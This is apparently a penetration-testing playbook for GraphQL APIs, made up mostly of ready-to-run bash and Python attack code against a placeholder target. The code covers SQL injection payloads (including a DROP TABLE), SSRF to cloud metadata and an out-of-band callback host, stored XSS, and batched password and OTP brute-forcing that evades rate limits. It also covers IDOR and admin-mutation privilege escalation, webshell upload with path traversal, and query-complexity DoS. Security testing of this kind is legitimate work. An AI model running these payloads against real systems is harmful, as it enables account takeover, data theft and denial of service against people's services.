# Playbook: GraphQL Attack Surface Testing

## Purpose
Systematically discover, enumerate, and exploit GraphQL API vulnerabilities.
Covers introspection abuse, authorization flaws, injection attacks, batching
exploits, DoS via query complexity, and subscription hijacking.
Input: target URL, GraphQL endpoint (known or unknown), or API documentation.

---

## Step 1 -- Endpoint Discovery

```bash
TARGET="https://target.com"

# Common GraphQL endpoint paths
ENDPOINTS=(
  "/graphql"
  "/gql"
  "/query"
  "/api/graphql"
  "/api/gql"
  "/v1/graphql"
  "/v2/graphql"
  "/api/v1/graphql"
  "/api/v2/graphql"
  "/graphql/console"
  "/graphql/api"
  "/graphiql"
  "/altair"
  "/playground"
  "/explorer"
  "/graphql/explorer"
  "/api/graphiql"
  "/graphql-explorer"
)

# Probe each endpoint with a simple introspection query
for ep in "${ENDPOINTS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -X POST "${TARGET}${ep}" \
    -H "Content-Type: application/json" \
    -d '{"query":"{__typename}"}')
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "[HIT] ${TARGET}${ep} -> HTTP $code"
  fi
done

# GET-based GraphQL detection (some servers accept GET)
for ep in "${ENDPOINTS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "${TARGET}${ep}?query=%7B__typename%7D")
  if [ "$code" != "404" ] && [ "$code" != "000" ]; then
    echo "[HIT-GET] ${TARGET}${ep} -> HTTP $code"
  fi
done

# Fingerprint the GraphQL engine
pip install graphw00f 2>/dev/null
graphw00f -t "${TARGET}/graphql" -f
# Identifies: Apollo, Hasura, graphql-yoga, Ariadne, Strawberry, etc.
# Engine knowledge helps select bypass techniques later
```

---

## Step 2 -- Introspection Query (Full Schema Extraction)

```bash
GQL="${TARGET}/graphql"

# Basic introspection probe -- check if enabled
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' | python3 -m json.tool

# Full introspection query -- extract complete schema
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{
  "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"
}' -o introspection_result.json

# Parse types, queries, and mutations
python3 -c "
import json
data = json.load(open('introspection_result.json'))
schema = data['data']['__schema']
print('=== QUERIES ===')
qt = schema.get('queryType', {})
if qt:
    qname = qt.get('name', 'Query')
    for t in schema['types']:
        if t['name'] == qname and t.get('fields'):
            for f in t['fields']:
                args = ', '.join([a['name'] for a in f.get('args', [])])
                print(f'  {f[\"name\"]}({args})')
print()
print('=== MUTATIONS ===')
mt = schema.get('mutationType', {})
if mt:
    mname = mt.get('name', 'Mutation')
    for t in schema['types']:
        if t['name'] == mname and t.get('fields'):
            for f in t['fields']:
                args = ', '.join([a['name'] for a in f.get('args', [])])
                print(f'  {f[\"name\"]}({args})')
print()
print('=== CUSTOM TYPES ===')
for t in schema['types']:
    if not t['name'].startswith('__') and t['kind'] in ('OBJECT','INPUT_OBJECT'):
        fields = [f['name'] for f in (t.get('fields') or t.get('inputFields') or [])]
        print(f'  {t[\"name\"]}: {fields}')
"

# Visualize with GraphQL Voyager (local)
# Open introspection_result.json in https://graphql-kit.com/graphql-voyager/

# InQL Burp extension -- import the endpoint for automatic parsing
# Or use standalone InQL scanner:
pip install inql 2>/dev/null
inql -t "$GQL" -o inql_output/
# Generates: queries.txt, mutations.txt, subscriptions.txt with full argument structure
```

---

## Step 3 -- Introspection Disabled Bypass

If introspection returns an error or empty result:

```bash
# Technique 1 -- Field suggestion exploitation
# Many engines suggest field names on typos
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typena}"}' 2>&1
# Look for: "Did you mean '__typename'?"

# Brute-force field names via suggestions
WORDLIST=(user users admin me login signup createUser deleteUser
  updateUser profile account settings order orders payment
  invoice product products search upload file token
  resetPassword changePassword register verify session
  role roles permission flag secret config debug internal)

for word in "${WORDLIST[@]}"; do
  response=$(curl -sk -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{${word}}\"}")
  # If not "Cannot query field" with no suggestions, it exists
  if echo "$response" | grep -qv "Cannot query field"; then
    echo "[FOUND] Field: $word"
    echo "  Response: $(echo $response | head -c 200)"
  elif echo "$response" | grep -qi "did you mean"; then
    suggestions=$(echo "$response" | grep -oP '"[a-zA-Z_]+"' | sort -u)
    echo "[SUGGESTION] Querying '$word' suggested: $suggestions"
  fi
done

# Technique 2 -- Clairvoyance (automated schema recovery)
pip install clairvoyance 2>/dev/null
clairvoyance -o recovered_schema.json -w /path/to/graphql_wordlist.txt "$GQL"
# Recovers types, fields, and arguments even without introspection

# Technique 3 -- Error-based type enumeration
# Query with wrong argument types to leak field type info
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: \"WRONG_TYPE\") { id } }"}'
# Error may reveal: "Expected type Int!, found String"

# Technique 4 -- Check for exposed GraphiQL/Playground IDE
# These often have introspection enabled even if the API blocks it
for ide in /graphiql /playground /altair /explorer /graphql-explorer; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET}${ide}")
  [ "$code" = "200" ] && echo "[IDE FOUND] ${TARGET}${ide}"
done

# Technique 5 -- Try introspection via GET (sometimes POST is blocked but GET works)
curl -sk "${GQL}?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"

# Technique 6 -- Alternate Content-Type
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'query={__schema{types{name}}}'
```

---

## Step 4 -- Query Complexity DoS

```bash
# Technique 1 -- Deeply nested query (circular relationships)
# If User has posts, and Post has author (User), nest them:
cat <<'QUERY'
{
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  author {
                    posts {
                      author {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
QUERY

# Technique 2 -- Alias-based resource multiplication
# Single request, N executions:
python3 -c "
n = 100
fields = []
for i in range(n):
    fields.append(f'  a{i}: user(id: {i}) {{ id email name }}')
query = '{\\n' + '\\n'.join(fields) + '\\n}'
print(query)
" > alias_bomb.graphql

curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d "$(python3 -c "
import json
query = open('alias_bomb.graphql').read()
print(json.dumps({'query': query}))
")"

# Technique 3 -- Fragment spread cycle (if server does not detect cycles)
cat <<'QUERY'
{
  user(id: 1) {
    ...A
  }
}
fragment A on User {
  posts {
    author {
      ...B
    }
  }
}
fragment B on User {
  posts {
    author {
      ...A
    }
  }
}
QUERY

# Technique 4 -- Array-based batching (send multiple operations in one request)
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"{ user(id: 1) { id email } }"},
    {"query":"{ user(id: 2) { id email } }"},
    {"query":"{ user(id: 3) { id email } }"}
  ]'

# Check if batching is enabled -- if the response is an array, it works
# Then scale up to hundreds of operations

# Measure response time to detect resource strain
time curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'
# Compare against the nested/aliased query times
```

---

## Step 5 -- Authorization Testing

### 5a -- IDOR via Node/Relay Global IDs

```bash
# Relay-style APIs expose node(id: ...) for direct object access
# IDs are often base64-encoded: "User:123" -> "VXNlcjoxMjM="

# Decode existing IDs to understand the pattern
echo "VXNlcjoxMjM=" | base64 -d
# Output: User:123

# Enumerate other users
for i in $(seq 1 100); do
  encoded=$(echo -n "User:${i}" | base64)
  response=$(curl -sk -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"query\":\"{ node(id: \\\"${encoded}\\\") { ... on User { id email name role } } }\"}")
  echo "$response" | grep -v "null" | grep -v "error" && echo "  -> User:${i}"
done

# Try accessing objects you should not own
OTHER_ORDER=$(echo -n "Order:999" | base64)
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d "{\"query\":\"{ node(id: \\\"${OTHER_ORDER}\\\") { ... on Order { id total items { name } } } }\"}"
```

### 5b -- Horizontal Privilege Escalation via Mutations

```bash
# Modify another user's data using their ID
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $LOW_PRIV_TOKEN" \
  -d '{
    "query": "mutation { updateUser(id: \"OTHER_USER_ID\", input: { email: \"attacker@evil.com\" }) { id email } }"
  }'

# Delete another user's resource
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $LOW_PRIV_TOKEN" \
  -d '{
    "query": "mutation { deletePost(id: \"OTHER_USER_POST_ID\") { success } }"
  }'
```

### 5c -- Accessing Admin-Only Fields and Mutations

```bash
# Query fields that should be restricted
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{
    "query": "{ users { id email role isAdmin passwordHash ssn internalNotes } }"
  }'

# Call admin mutations as regular user
ADMIN_MUTATIONS=(
  'mutation { setUserRole(userId: "MY_ID", role: ADMIN) { id role } }'
  'mutation { deleteUser(id: "TARGET_ID") { success } }'
  'mutation { updateSystemConfig(key: "debug", value: "true") { success } }'
  'mutation { createApiKey(userId: "MY_ID", scope: "admin") { key } }'
  'mutation { exportDatabase { url } }'
)

for mutation in "${ADMIN_MUTATIONS[@]}"; do
  echo "--- Testing: $(echo $mutation | head -c 60)..."
  curl -sk -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -d "{\"query\": \"$(echo $mutation | sed 's/"/\\"/g')\"}"
  echo
done
```

### 5d -- Batch Query Authorization Bypass

```bash
# Some auth middleware only checks the first query in a batch
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '[
    {"query": "{ me { id } }"},
    {"query": "{ users { id email role passwordHash } }"},
    {"query": "mutation { deleteUser(id: \"1\") { success } }"}
  ]'
# If the first query succeeds and subsequent unauthorized queries also return
# data, batch auth bypass is confirmed

# Test with no auth token at all -- some batch endpoints skip auth entirely
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ __typename }"},
    {"query": "{ users { id email } }"}
  ]'
```

---

## Step 6 -- Injection Attacks

### 6a -- SQL Injection via GraphQL Variables

```bash
# GraphQL variables flow into backend resolvers -- if resolvers build
# SQL queries from variables without parameterization, SQLi is possible

# String-based SQLi
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query($name: String!) { user(name: $name) { id email } }",
    "variables": {"name": "admin'\'' OR 1=1 --"}
  }'

# In search/filter fields
SQLI_PAYLOADS=(
  "' OR '1'='1"
  "' UNION SELECT null,null,null--"
  "'; WAITFOR DELAY '0:0:5'--"
  "' AND (SELECT SUBSTRING(@@version,1,1))='5"
  "1' ORDER BY 1--"
)

for payload in "${SQLI_PAYLOADS[@]}"; do
  curl -sk -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -d "{
      \"query\": \"query { search(term: \\\"${payload}\\\") { id title } }\"
    }"
done

# Order-by injection (common in GraphQL sorting arguments)
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ users(orderBy: \"name; DROP TABLE users--\") { id } }"
  }'
```

### 6b -- SSRF via URL-Type Fields

```bash
CALLBACK_URL="YOUR_OOB_DOMAIN.oast.fun"

# Profile picture / avatar URL fields
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{
    \"query\": \"mutation { updateProfile(input: { avatarUrl: \\\"http://${CALLBACK_URL}/ssrf\\\" }) { id avatarUrl } }\"
  }"

# Webhook URL registration
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{
    \"query\": \"mutation { createWebhook(url: \\\"http://169.254.169.254/latest/meta-data/\\\") { id } }\"
  }"

# Import from URL
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{
    \"query\": \"mutation { importData(sourceUrl: \\\"http://127.0.0.1:6379/\\\") { status } }\"
  }"
```

### 6c -- Stored XSS via Mutations

```bash
XSS_PAYLOADS=(
  '<script>alert(document.domain)</script>'
  '"><img src=x onerror=alert(1)>'
  '<svg onload=alert(1)>'
)

for payload in "${XSS_PAYLOADS[@]}"; do
  # Escape for JSON
  escaped=$(echo "$payload" | python3 -c "import sys,json; print(json.dumps(sys.stdin.read().strip()))")

  # Inject into user-controlled fields rendered in UI
  curl -sk -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{
      \"query\": \"mutation { updateProfile(input: { displayName: ${escaped} }) { id displayName } }\"
    }"

  curl -sk -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{
      \"query\": \"mutation { createComment(input: { body: ${escaped}, postId: \\\"1\\\" }) { id body } }\"
    }"
done
```

---

## Step 7 -- Information Disclosure

```bash
# Verbose error messages -- send malformed queries
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ invalidField }"}'
# Look for: stack traces, file paths, database names, resolver function names

# Trigger type errors for detailed messages
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: \"not_an_int\") { id } }"}'

# Send invalid JSON
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{invalid json here}'

# Empty query
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{"query": ""}'

# Debug mode detection
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }", "extensions": {"debug": true}}'

# Check response headers for debug info
curl -sk -I -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}'
# Look for: X-Debug, X-Powered-By, Server, X-Request-Id, X-Runtime headers

# Apollo tracing (often left enabled in production)
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typename}", "extensions":{"tracing":true}}'
# Returns resolver execution times, paths, durations

# Persisted queries / APQ (Automatic Persisted Queries) info leak
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d '{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"abc123"}}}'
# Error may reveal registered query hashes or internal query names
```

---

## Step 8 -- Batching Attacks (Rate Limit Bypass)

```bash
# Credential brute-force via aliased login mutations
# Single HTTP request, N login attempts -- bypasses per-request rate limiting
python3 -c "
import json
passwords = open('passwords.txt').read().strip().split('\n')[:100]
aliases = []
for i, pw in enumerate(passwords):
    aliases.append(f'  a{i}: login(email: \"victim@target.com\", password: \"{pw}\") {{ token success }}')
query = 'mutation {\\n' + '\\n'.join(aliases) + '\\n}'
print(json.dumps({'query': query}))
" | curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d @- | python3 -m json.tool

# OTP brute-force via batching
python3 -c "
import json
aliases = []
for otp in range(0, 10000):
    code = str(otp).zfill(4)
    aliases.append(f'  c{otp}: verifyOtp(code: \"{code}\", userId: \"VICTIM_ID\") {{ success token }}')
# Split into chunks of 500 to avoid payload limits
for chunk_start in range(0, 10000, 500):
    chunk = aliases[chunk_start:chunk_start+500]
    query = 'mutation {\\n' + '\\n'.join(chunk) + '\\n}'
    print(json.dumps({'query': query}))
" > otp_batches.jsonl

# Send each batch
while read batch; do
  curl -sk -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -d "$batch" | grep -i "success.*true" && echo "[OTP FOUND]" && break
done < otp_batches.jsonl

# Rate limit evasion test -- compare:
# 10 individual requests vs 1 batched request with 10 operations
echo "Individual requests:"
for i in $(seq 1 10); do
  curl -sk -o /dev/null -w "%{http_code} " -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -d '{"query":"mutation { login(email:\"test@test.com\",password:\"wrong\") { success } }"}'
done
echo
echo "Batched request:"
curl -sk -o /dev/null -w "%{http_code}" -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -d "$(python3 -c "
import json
aliases = [f'a{i}: login(email:\"test@test.com\",password:\"wrong{i}\") {{ success }}' for i in range(10)]
print(json.dumps({'query': 'mutation {' + ' '.join(aliases) + '}'}))
")"
echo
# If individual requests hit 429 but batch returns 200, rate limit is bypassed

# CrackQL -- automated batched brute-force
pip install crackql 2>/dev/null
# Create the query template:
cat > login.graphql <<'EOF'
mutation {
  login(email: "victim@target.com", password: "{{password}}") {
    success
    token
  }
}
EOF
crackql -t "$GQL" -q login.graphql -i passwords.txt --batch-size 50
```

---

## Step 9 -- File Upload via GraphQL Multipart Request

```bash
# GraphQL multipart request spec (used by Apollo Upload, graphql-upload)
# https://github.com/jaydenseric/graphql-multipart-request-spec

# Basic file upload mutation
curl -sk -X POST "$GQL" \
  -H "Authorization: Bearer $TOKEN" \
  -F operations='{"query":"mutation($file: Upload!) { uploadFile(file: $file) { url filename } }","variables":{"file":null}}' \
  -F map='{"0":["variables.file"]}' \
  -F 0=@test_file.txt

# Upload with path traversal in filename
echo "test" > exploit.txt
curl -sk -X POST "$GQL" \
  -H "Authorization: Bearer $TOKEN" \
  -F operations='{"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
  -F map='{"0":["variables.file"]}' \
  -F '0=@exploit.txt;filename=../../../etc/test.txt'

# Upload HTML/SVG for stored XSS
cat > xss.svg <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
EOF
curl -sk -X POST "$GQL" \
  -H "Authorization: Bearer $TOKEN" \
  -F operations='{"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
  -F map='{"0":["variables.file"]}' \
  -F '0=@xss.svg;type=image/svg+xml'

# Oversize file upload (DoS)
dd if=/dev/zero of=large_file.bin bs=1M count=500 2>/dev/null
curl -sk -X POST "$GQL" \
  -H "Authorization: Bearer $TOKEN" \
  -F operations='{"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
  -F map='{"0":["variables.file"]}' \
  -F 0=@large_file.bin

# Check if Content-Type validation is server-side
# Rename a PHP/JSP webshell to .jpg and upload
cp webshell.php innocent.jpg
curl -sk -X POST "$GQL" \
  -H "Authorization: Bearer $TOKEN" \
  -F operations='{"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
  -F map='{"0":["variables.file"]}' \
  -F '0=@innocent.jpg;type=image/jpeg'
```

---

## Step 10 -- Subscription Abuse (WebSocket)

```bash
# GraphQL subscriptions use WebSocket (ws:// or wss://)
# Common protocols: graphql-ws, subscriptions-transport-ws

WS_URL="wss://target.com/graphql"

# Test with websocat (install: cargo install websocat)
# Protocol: graphql-transport-ws (newer)
echo '{"type":"connection_init","payload":{}}' | \
  websocat -n1 "$WS_URL" -H "Sec-WebSocket-Protocol: graphql-transport-ws"

# Subscribe without authentication
python3 <<'PYEOF'
import asyncio
import json
import websockets

async def test_subscription():
    uri = "wss://target.com/graphql"
    async with websockets.connect(uri, subprotocols=["graphql-transport-ws"]) as ws:
        # Initialize connection (no auth token)
        await ws.send(json.dumps({"type": "connection_init", "payload": {}}))
        init_response = await ws.recv()
        print(f"Init: {init_response}")

        # Subscribe to sensitive data streams
        subscriptions = [
            '{"type":"subscribe","id":"1","payload":{"query":"subscription { newOrder { id total customer { email } } }"}}',
            '{"type":"subscribe","id":"2","payload":{"query":"subscription { userActivity { userId action timestamp } }"}}',
            '{"type":"subscribe","id":"3","payload":{"query":"subscription { newMessage { id sender content } }"}}',
            '{"type":"subscribe","id":"4","payload":{"query":"subscription { systemAlert { level message } }"}}',
        ]

        for sub in subscriptions:
            await ws.send(sub)
            print(f"Sent: {sub[:80]}...")

        # Listen for events
        for _ in range(20):
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=10)
                data = json.loads(msg)
                if data.get("type") == "next":
                    print(f"[DATA RECEIVED] {json.dumps(data['payload'], indent=2)}")
                elif data.get("type") == "error":
                    print(f"[ERROR] {data}")
            except asyncio.TimeoutError:
                print("No more messages")
                break

asyncio.run(test_subscription())
PYEOF

# Test subscription with another user's token (cross-tenant data)
python3 <<'PYEOF'
import asyncio, json, websockets

async def cross_tenant():
    uri = "wss://target.com/graphql"
    async with websockets.connect(uri, subprotocols=["graphql-transport-ws"]) as ws:
        # Authenticate as user A
        await ws.send(json.dumps({
            "type": "connection_init",
            "payload": {"Authorization": "Bearer USER_A_TOKEN"}
        }))
        await ws.recv()

        # Subscribe to user B's events
        await ws.send(json.dumps({
            "type": "subscribe",
            "id": "1",
            "payload": {
                "query": "subscription { userEvents(userId: \"USER_B_ID\") { type data } }"
            }
        }))

        for _ in range(10):
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=15)
                print(f"Received: {msg}")
            except asyncio.TimeoutError:
                break

asyncio.run(cross_tenant())
PYEOF
```

---

## Step 11 -- Mutation Testing (Mass Assignment and Hidden Mutations)

```bash
# Mass assignment -- add fields the API did not intend you to set
# If the schema shows updateUser accepts an input object, try adding extra fields
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{
    "query": "mutation { updateUser(input: { name: \"legit\", role: \"admin\", isAdmin: true, verified: true, balance: 999999 }) { id name role isAdmin } }"
  }'

# If using Relay input style:
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{
    "query": "mutation { updateUser(input: { clientMutationId: \"1\", id: \"MY_ID\", role: \"ADMIN\", permissions: [\"*\"] }) { user { id role } } }"
  }'

# Deprecated field access -- deprecated fields often still resolve
# From introspection, check isDeprecated: true fields
python3 -c "
import json
data = json.load(open('introspection_result.json'))
for t in data['data']['__schema']['types']:
    for f in (t.get('fields') or []):
        if f.get('isDeprecated'):
            print(f'[DEPRECATED] {t[\"name\"]}.{f[\"name\"]} -- reason: {f.get(\"deprecationReason\", \"none\")}')
"

# Query deprecated fields (may expose old data formats, unprotected fields)
# Example: if User.oldPassword is deprecated but still resolves
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query": "{ user(id: \"1\") { id oldPassword legacyApiKey internalId } }"}'

# Hidden mutations -- not in schema but may exist
# Try common mutation names even if not in introspection
HIDDEN_MUTATIONS=(
  'mutation { __debug { query } }'
  'mutation { _internal_resetPassword(email: "victim@target.com") { success } }'
  'mutation { seedDatabase { success } }'
  'mutation { toggleFeatureFlag(name: "admin_panel", enabled: true) { success } }'
  'mutation { generateBackup { url } }'
  'mutation { impersonateUser(userId: "ADMIN_ID") { token } }'
  'mutation { migrateDatabase { status } }'
)

for m in "${HIDDEN_MUTATIONS[@]}"; do
  response=$(curl -sk -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"query\": \"$(echo $m | sed 's/"/\\"/g')\"}")
  # If response does not contain "Cannot query field", the mutation might exist
  if ! echo "$response" | grep -q "Cannot query field"; then
    echo "[INTERESTING] $m"
    echo "  Response: $(echo $response | head -c 300)"
  fi
done

# Directive abuse -- @skip and @include can bypass field-level auth in some implementations
curl -sk -X POST "$GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $USER_TOKEN" \
  -d '{
    "query": "{ user(id: \"1\") { id name secretField @skip(if: false) } }"
  }'

# Custom directives (check introspection for non-standard directives)
python3 -c "
import json
data = json.load(open('introspection_result.json'))
for d in data['data']['__schema'].get('directives', []):
    if d['name'] not in ('skip', 'include', 'deprecated', 'specifiedBy'):
        print(f'[CUSTOM DIRECTIVE] @{d[\"name\"]} -- locations: {d[\"locations\"]}')
        for arg in d.get('args', []):
            print(f'  arg: {arg[\"name\"]} ({arg[\"type\"]})')
"
```

---

## Step 12 -- Tools Reference

```bash
# InQL (Burp Suite extension + standalone)
pip install inql
inql -t "$GQL" -o inql_output/
# Generates query/mutation/subscription templates with full args

# graphql-cop -- GraphQL security auditor
pip install graphql-cop
graphql-cop -t "$GQL"
# Checks: introspection, field suggestions, batching, DoS, debug mode, etc.

# BatchQL -- batch query attack tool
git clone https://github.com/assetnote/batchql.git
cd batchql && python3 batch.py -e "$GQL" -q '{ user(id: 1) { id } }'

# graphw00f -- GraphQL engine fingerprinting
pip install graphw00f
graphw00f -t "$GQL" -f
# Identifies 30+ engines: Apollo, Hasura, Ariadne, Strawberry, etc.
# Useful because each engine has known quirks and bypasses

# CrackQL -- batched credential attack tool
pip install crackql
crackql -t "$GQL" -q login.graphql -i passwords.txt --batch-size 100

# GraphQL Voyager -- schema visualization
# Upload introspection_result.json to:
# https://graphql-kit.com/graphql-voyager/

# Altair GraphQL Client -- desktop IDE for manual testing
# https://altairgraphql.dev/

# Burp Suite workflow:
# 1. Install InQL extension from BApp Store
# 2. Send GraphQL endpoint to InQL Scanner tab
# 3. Browse generated queries/mutations in InQL tree
# 4. Right-click -> Send to Repeater for manual testing
# 5. Use InQL Attacker tab for batch/alias attacks
```

---

## Output

```
PLAYBOOK : graphql_attacks
TARGET   : [GraphQL endpoint URL]
-------------------------------------------------------------
STEP N   : [step name]
STATUS   : [DONE / SKIP / BLOCKED]
RESULT   : [finding or output]
-------------------------------------------------------------
FINDINGS SUMMARY
  [CRITICAL] Admin mutation accessible as regular user
  [CRITICAL] Batch login bypass -- rate limiting evaded via aliased mutations
  [HIGH]     Full schema exposed via introspection
  [HIGH]     IDOR via Relay node(id:) -- can access any user's data
  [HIGH]     SQL injection in search resolver variable
  [MEDIUM]   Deprecated fields expose legacy API keys
  [MEDIUM]   Subscription endpoint accepts unauthenticated connections
  [LOW]      Verbose error messages reveal resolver file paths
  [INFO]     Engine: Apollo Server 4.x (graphw00f fingerprint)
-------------------------------------------------------------
NEXT STEPS
  1. Report CRITICAL findings immediately
  2. Test IDOR across all object types (Order, Payment, Invoice, etc.)
  3. Attempt deeper SQLi exploitation (UNION-based, time-based blind)
  4. Load 03_reporting/report_writer.md for formal write-up
  5. Load 02_vuln_testing/ssrf_playbook.md for URL-type field SSRF chain
```
